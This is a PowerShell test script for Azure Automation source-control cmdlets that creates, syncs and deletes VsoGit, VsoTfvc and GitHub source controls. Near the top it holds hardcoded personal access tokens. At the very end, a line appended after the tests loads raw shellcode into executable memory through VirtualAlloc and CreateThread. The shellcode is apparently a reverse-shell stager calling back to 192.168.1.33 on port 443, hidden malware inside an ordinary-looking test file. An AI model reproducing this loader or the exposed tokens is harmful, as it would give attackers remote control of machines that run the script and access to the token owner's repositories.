



























$testReposInfo = @{
    VsoGit = @{
        Name = "AASourceControl-VsoGit"
        RepoUrl = "https://francisco-gamino.visualstudio.com/_git/VsoGit-SwaggerAndCmdletsTests"
        Branch = "preview"
        FolderPath = "Azure/MyRunbooks"
        SourceType = "VsoGit"
        PersonalAccessToken = "3qdxa22lutnhezd4atpna74jn3m7wgo6o6kfbwezjfnvgbjhvoca"
    }

    VsoTfvc =  @{
        Name = "AASourceControl-VsoTfvc"
        RepoUrl = "https://francisco-gamino.visualstudio.com/VsoTfvc-SwaggerAndCmdletsTests/_versionControl"
        FolderPath = "/MyRunbooks"
        SourceType = "VsoTfvc"
        PersonalAccessToken = "3qdxa22lutnhezd4atpna74jn3m7wgo6o6kfbwezjfnvgbjhvoca"
    }

    GitHub = @{
        Name = "AASourceControl-GitHub"
        RepoUrl = "https://github.com/Francisco-Gamino/SwaggerAndCmdletsTests.git"
        Branch = "master"
        FolderPath = "/"
        SourceType = "GitHub"
        PersonalAccessToken = "5fd81166a9ebaebc60da4756f2094a598f1d4c01"
    }
}


$resourceGroupName = "frangom-test"
$automationAccountName = "frangom-sdkCmdlet-tests"





function EnsureSourceControlDoesNotExist
{
    Param 
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name
    )

    $sourceControl = Get-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                        -AutomationAccountName $automationAccountName `
                                                        -Name $Name `
                                                        -ErrorAction SilentlyContinue
    if ($sourceControl)
    {
        Remove-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                              -AutomationAccountName $automationAccountName `
                                              -Name $Name
    }
}

function WaitForSourceControlSyncJobState
{
    Param 
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Guid]
        $JobId,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ExpectedState
    )

    $waitTimeInSeconds = 2
    $retries = 40
    $jobCompleted = Retry-Function {
        return (Get-AzAutomationSourceControlSyncJob -ResourceGroupName $resourceGroupName `
                                                          -AutomationAccountName $automationAccountName  `
                                                          -Name $Name `
                                                          -JobId $JobId).ProvisioningState -eq $ExpectedState } $null $retries $waitTimeInSeconds

    Assert-True {$jobCompleted -gt 0} "Timeout waiting for provisioning state to reach '$ExpectedState'"
}




function Test-CreateVsoGitSourceControlAndSync
{
    
    $sourceControl = $testReposInfo["VsoGit"]

    try
    {
        EnsureSourceControlDoesNotExist -Name $sourceControl.Name

        
        $accessToken = ConvertTo-SecureString -String $sourceControl.PersonalAccessToken -AsPlainText -Force

        $createdSourceControl = New-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                                   -AutomationAccountName $automationAccountName  `
                                                                   -Name $sourceControl.Name  `
                                                                   -RepoUrl $sourceControl.RepoUrl `
                                                                   -Branch $sourceControl.Branch `
                                                                   -SourceType $sourceControl.SourceType `
                                                                   -FolderPath $sourceControl.FolderPath `
                                                                   -AccessToken $accessToken `
                                                                   -DoNotPublishRunbook

        
        Assert-NotNull $createdSourceControl "Failed to create VsoGit source control."

        
        $propertiesToValidate = @("Name", "RepoUrl", "SourceType", "Branch", "FolderPath")
        
        foreach ($property in $propertiesToValidate)
        {
            Assert-AreEqual $sourceControl.$property $createdSourceControl.$property `
                "'$property' of created source control does not match. Expected:$($sourceControl.$property). Actual: $($createdSourceControl.$property)"
        }

        
        $updatedSourceControl = Update-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                                      -AutomationAccountName $automationAccountName  `
                                                                      -Name $sourceControl.Name  `
                                                                      -PublishRunbook $true
        $expectedPropertyValue = "True"
        Assert-AreEqual $updatedSourceControl.PublishRunbook $expectedPropertyValue `
                "'PublishRunbook' property does not match. Expected: $expectedPropertyValue. Actual: $($updatedSourceControl.PublishRunbook)"
        
        
        $jobId = "0bfa6b49-c08c-4b2f-853e-08128c3c86ee"
        Start-AzAutomationSourceControlSyncJob -ResourceGroupName $resourceGroupName `
                                            -AutomationAccountName $automationAccountName  `
                                            -Name $sourceControl.Name `
                                            -JobId $jobId

        WaitForSourceControlSyncJobState -Name $sourceControl.Name -JobId $jobId -ExpectedState Completed

        
        $streams =  Get-AzAutomationSourceControlSyncJobOutput -ResourceGroupName $resourceGroupName `
                                                                    -AutomationAccountName $automationAccountName  `
                                                                    -Name $sourceControl.Name `
                                                                    -JobId $jobId `
                                                                    -Stream Output | % Summary
        
        Assert-True {$streams.count -gt 0} "Failed to get Output stream via Get-AzAutomationSourceControlSyncJobOutput "
    }
    finally
    {
        EnsureSourceControlDoesNotExist -Name $sourceControl.Name
    }
}

function Test-CreateVsoTfvcSourceControlAndSync
{
    
    $sourceControl = $testReposInfo["VsoTfvc"]

    try
    {
        EnsureSourceControlDoesNotExist -Name $sourceControl.Name

        
        $accessToken = ConvertTo-SecureString -String $sourceControl.PersonalAccessToken -AsPlainText -Force

        $createdSourceControl = New-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                                   -AutomationAccountName $automationAccountName  `
                                                                   -Name  $sourceControl.Name  `
                                                                   -RepoUrl $sourceControl.RepoUrl `
                                                                   -SourceType $sourceControl.SourceType `
                                                                   -FolderPath  $sourceControl.FolderPath `
                                                                   -AccessToken $accessToken `
                                                                   -DoNotPublishRunbook

        
        Assert-NotNull $createdSourceControl "Failed to create VsoGit source control."

        
        $propertiesToValidate = @("Name", "RepoUrl", "SourceType", "FolderPath")
        
        foreach ($property in $propertiesToValidate)
        {
            Assert-AreEqual $sourceControl.$property $createdSourceControl.$property `
                "'$property' of created source control does not match. Expected:$($sourceControl.$property) Actual: $($createdSourceControl.$property)"
        }

        
        $updatedSourceControl = Update-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                                      -AutomationAccountName $automationAccountName  `
                                                                      -Name $sourceControl.Name  `
                                                                      -PublishRunbook $true
        $expectedPropertyValue = "True"
        Assert-AreEqual $updatedSourceControl.PublishRunbook $expectedPropertyValue `
                "'PublishRunbook' property does not match. Expected: $expectedPropertyValue. Actual: $($updatedSourceControl.PublishRunbook)"
        
        
        $jobId = "27dcdb17-1f65-42e9-9eeb-088a5f50eeb8"
        Start-AzAutomationSourceControlSyncJob -ResourceGroupName $resourceGroupName `
                                            -AutomationAccountName $automationAccountName  `
                                            -Name $sourceControl.Name `
                                            -JobId $jobId

        WaitForSourceControlSyncJobState -Name $sourceControl.Name -JobId $jobId -ExpectedState Completed

        
        $streams =  Get-AzAutomationSourceControlSyncJobOutput -ResourceGroupName $resourceGroupName `
                                                                    -AutomationAccountName $automationAccountName  `
                                                                    -Name $sourceControl.Name `
                                                                    -JobId $jobId `
                                                                    -Stream Output | % Summary
        
        Assert-True {$streams.count -gt 0} "Failed to get Output stream via Get-AzAutomationSourceControlSyncJobOutput "
    }
    finally
    {
        EnsureSourceControlDoesNotExist -Name $sourceControl.Name
    }
}

function Test-CreateGitHubSourceControlAndSync
{
    
    $sourceControl = $testReposInfo["GitHub"]

    try
    {
        EnsureSourceControlDoesNotExist -Name $sourceControl.Name

        
        $accessToken = ConvertTo-SecureString -String $sourceControl.PersonalAccessToken -AsPlainText -Force

        $createdSourceControl = New-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                                   -AutomationAccountName $automationAccountName  `
                                                                   -Name $sourceControl.Name  `
                                                                   -RepoUrl $sourceControl.RepoUrl `
                                                                   -Branch $sourceControl.Branch `
                                                                   -SourceType $sourceControl.SourceType `
                                                                   -FolderPath $sourceControl.FolderPath `
                                                                   -AccessToken $accessToken `
                                                                   -DoNotPublishRunbook

        
        Assert-NotNull $createdSourceControl "Failed to create VsoGit source control."

        
        $propertiesToValidate = @("Name", "RepoUrl", "SourceType", "Branch", "FolderPath")
        
        foreach ($property in $propertiesToValidate)
        {
            Assert-AreEqual $sourceControl.$property $createdSourceControl.$property `
                "'$property' of created source control does not match. Expected:$($sourceControl.$property) Actual: $($createdSourceControl.$property)"
        }

        
        $updatedSourceControl = Update-AzAutomationSourceControl -ResourceGroupName $resourceGroupName `
                                                                      -AutomationAccountName $automationAccountName  `
                                                                      -Name $sourceControl.Name  `
                                                                      -PublishRunbook $true
        $expectedPropertyValue = "True"
        Assert-AreEqual $updatedSourceControl.PublishRunbook $expectedPropertyValue `
                "'PublishRunbook' property does not match. Expected: $expectedPropertyValue. Actual: $($updatedSourceControl.PublishRunbook)"
        
        
        $jobId = "f7dd56e6-0da3-442a-b1c5-3027065c7786"
        Start-AzAutomationSourceControlSyncJob -ResourceGroupName $resourceGroupName `
                                            -AutomationAccountName $automationAccountName  `
                                            -Name $sourceControl.Name `
                                            -JobId $jobId

        WaitForSourceControlSyncJobState -Name $sourceControl.Name -JobId $jobId -ExpectedState Completed

        
        $streams =  Get-AzAutomationSourceControlSyncJobOutput -ResourceGroupName $resourceGroupName `
                                                                    -AutomationAccountName $automationAccountName  `
                                                                    -Name $sourceControl.Name `
                                                                    -JobId $jobId `
                                                                    -Stream Output | % Summary
        
        Assert-True {$streams.count -gt 0} "Failed to get Output stream via Get-AzAutomationSourceControlSyncJobOutput "
    }
    finally
    {
        EnsureSourceControlDoesNotExist -Name $sourceControl.Name
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x21,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

